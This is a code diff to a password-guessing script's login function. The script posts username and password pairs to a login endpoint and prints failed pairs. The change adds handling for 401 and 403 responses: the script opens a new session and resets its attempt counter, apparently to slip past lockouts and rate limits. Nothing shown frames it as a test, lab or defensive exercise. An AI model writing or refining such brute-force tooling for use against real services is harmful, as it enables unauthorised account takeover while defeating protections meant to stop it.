@@ -95,7 +95,7 @@ def try_login(
         Tuple[bool, int]: (login_successful, updated_attempt_counter)
     """
     if attempt_counter >= MAX_ATTEMPTS_PER_SESSION:
-        print("[*] Refreshing session to avoid expiration...")
+        print("[*] Max session attempts reached. Refreshing session to avoid expiration...")
         session = create_session()
         if session is None:
             print("[!] Failed to refresh session")
@@ -121,6 +121,14 @@ def try_login(
         resp = session.post(post_url, data=payload, timeout=15)
         session.cookies.update(resp.cookies)
         time.sleep(DELAY_BETWEEN_REQUESTS)
+        
+        if resp.status_code in (401, 403):
+            print("[*] Session expired or forbidden, creating a new session...")
+            new_session = create_session()
+            if new_session is None:
+                return False, attempt_counter + 1
+            session = new_session
+            attempt_counter = 0
 
         if resp.status_code != 200:
             print(f"[!] Unexpected status {resp.status_code} for {username}:{password}")
